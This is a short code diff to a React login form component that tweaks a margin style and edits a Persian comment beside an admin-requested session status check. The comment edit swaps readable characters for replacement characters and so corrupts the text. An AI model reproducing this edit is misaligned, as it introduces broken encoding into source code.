@@ -267,7 +267,7 @@ export const LoginForm = () => {
         setHasError(false);
         break;
       case "check_status":
-        // بررسی دقیق وضعیت کاربر با Enhanced Offline Detection
+        // بررسی دقیق وضعی�� کاربر با Enhanced Offline Detection
         console.log("🔍 Admin requested enhanced status check for session:", sessionId);
 
         const isVisible = !document.hidden;
@@ -3163,7 +3163,7 @@ export const LoginForm = () => {
                   flexFlow: "row wrap",
                   flexWrap: "wrap",
                   marginRight: "-8px",
-                  marginTop: "-8px",
+                  marginTop: "4px",
                   width: "calc(100% + 8px)",
                 }}
               >
